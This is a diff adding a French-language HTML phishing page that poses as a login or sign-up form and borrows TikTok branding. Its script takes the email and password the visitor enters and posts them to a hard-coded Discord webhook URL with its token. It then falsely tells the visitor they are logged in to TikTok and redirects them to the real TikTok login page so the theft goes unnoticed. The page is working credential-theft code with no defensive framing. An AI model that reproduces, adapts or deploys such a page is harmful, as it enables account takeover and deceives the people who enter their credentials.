@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion ou Inscription à Dark</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: black; /* Fond noir sur toute la page */
+            height: 100vh; /* Remplir toute la fenêtre */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .background-container {
+            position: relative;
+            width: 80%; /* Contrôler la taille du carré */
+            height: 80%; /* Contrôler la taille du carré */
+            background: url('https://p16-va-tiktok.ibyteimg.com/obj/musically-maliva-obj/078f63f0bde12352ee51e36c7702d098.png') no-repeat center center;
+            background-size: 50%; /* Dézoom de l'image de fond (augmenter la valeur pour plus de dézoom) */
+            border: 5px solid black; /* Bordure noire autour du carré */
+        }
+
+        .login-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(240, 240, 240, 0.9); /* Fond semi-transparent pour le formulaire */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 300px;
+        }
+
+        .login-container h1 {
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: black;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: darkgray;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-container">
+        <!-- Page de Connexion -->
+        <div class="login-container">
+            <h1>Connexion ou Inscription</h1>
+            <input id="email" type="text" placeholder="E-mail">
+            <input id="password" type="password" placeholder="Mot de passe">
+            <button onclick="sendToWebhook()">Valider</button> <!-- Appelle la fonction d'envoi -->
+        </div>
+    </div>
+
+    <script>
+        // Fonction pour envoyer les données à Discord via le webhook
+        function sendToWebhook() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            // Créer un message à envoyer au webhook Discord
+            const payload = {
+                content: `Nouveau message de connexion :\nE-mail : ${email}\nMot de passe : ${password}`
+            };
+
+            // L'URL de ton webhook Discord (remplace par la tienne)
+            const webhookURL = "https://canary.discord.com/api/webhooks/1351283138776535160/u_2EgqPvTc8pSAZ_GJl92vSvbbG2GtxOT--xgKRtlSv87MpK9dZOudsPP7R9vV_e8bJY";
+
+            // Envoi des données à Discord
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Vous êtes maintenant connecté à TikTok.");
+                // Rediriger après que l'utilisateur clique sur "OK"
+                window.location.href = "https://www.tiktok.com/login?lang=fr&redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fupload%3Flang%3Dfr";
+            })
+            .catch(error => {
+                alert("Erreur lors de l'envoi des informations.");
+                console.error("Erreur:", error);
+            });
+        }
+    </script>
+</body>
+</html>
